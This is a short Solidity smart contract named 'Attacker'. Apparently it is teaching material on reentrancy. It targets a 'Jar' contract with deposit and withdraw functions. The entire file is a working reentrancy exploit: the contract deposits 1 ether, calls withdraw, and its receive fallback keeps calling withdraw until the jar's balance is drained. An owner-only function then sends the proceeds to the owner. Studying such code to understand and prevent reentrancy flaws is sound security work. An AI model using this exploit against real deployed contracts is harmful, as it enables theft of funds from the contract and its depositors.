// SPDX-License-Identifier: CC-BY-4.0
pragma solidity >=0.8.0 <0.9.0;

interface IJar {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {

    IJar public jar;
    address public owner;

    constructor(address _jar) payable {
        jar = IJar(_jar);
        owner = msg.sender;
    }

    function prepare() public {
        jar.deposit{ value: 1 ether }();
    }

    function attack() public {
        jar.withdraw();
    }

    receive() external payable {
        if (address(jar).balance >= 1 ether) {
            jar.withdraw();
        }
    }

    function get() public {
        require (msg.sender == owner);
        (bool s, ) = owner.call{ value: address(this).balance}("");
        require (s);
    }
}

